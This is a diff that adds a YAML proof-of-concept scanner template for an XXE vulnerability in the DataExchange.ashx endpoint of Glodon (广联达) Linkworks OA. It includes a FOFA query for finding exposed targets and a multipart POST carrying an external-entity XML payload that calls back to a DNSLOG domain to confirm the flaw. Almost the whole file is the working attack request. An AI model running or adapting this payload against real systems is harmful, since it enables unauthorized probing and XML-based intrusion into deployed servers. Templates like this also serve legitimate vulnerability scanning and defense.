@@ -1,0 +1,53 @@
+id: poc-yaml-glodon-dataexchang-xxe
+info:
+  name: 广联达 DataExchang xxe漏洞
+  severity: high
+  tags:
+  - DNSLOG
+  - xxe
+  finger: 广联达 Linkworks办公OA
+  fofa: body="/Services/Identification/server"
+variables:
+  reverse: new_dns_log()
+  domain: reverse.Domain()
+  boundary: random_str(34)
+requests:
+- method: POST
+  path: /GB/LK/Document/DataExchange/DataExchange.ashx
+  headers:
+    Content-Type: multipart/form-data;boundary=----{{.boundary}}
+  data: '------{{.boundary}}
+
+    Content-Disposition: form-data;name="SystemName"
+
+
+    BIM
+
+    ------{{.boundary}}
+
+    Content-Disposition: form-data;name="Params"
+
+    Content-Type: text/plain
+
+
+    <?xml version="1.0" encoding="UTF-8"?>
+
+    <!DOCTYPE test [
+
+    <!ENTITY t SYSTEM "http://{{.domain}}">
+
+    ]
+
+    >
+
+    <test>&t;</test>
+
+    ------{{.boundary}}--
+
+    '
+  expression: 'status_code == 200 &&
+
+    reverse.Sleep(2)
+
+    '
+transport: http
